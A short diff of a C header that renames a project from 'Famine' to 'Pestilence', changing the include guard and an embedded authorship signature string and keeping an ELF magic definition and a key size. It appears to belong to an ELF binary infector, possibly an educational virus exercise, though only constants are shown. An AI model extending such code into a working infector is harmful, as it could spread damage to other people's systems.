@@ -1,5 +1,5 @@
-#ifndef FAMINE_H
-# define FAMINE_H
+#ifndef PESTILENCE_H
+# define PESTILENCE_H
 
 # include "tools.h"
 
@@ -19,7 +19,7 @@
 
 # define KEY_SIZE 64
 
-# define SIGNATURE ((char []){'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','v','s','t','e','f','f','e','n','\n','\0'})
+# define SIGNATURE ((char []){'P','e','s','t','i','l','e','n','c','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','v','s','t','e','f','f','e','n','\0'})
 
 # undef	 ELFMAG
 # define ELFMAG	(char []){0x7f, 'E','L','F'}
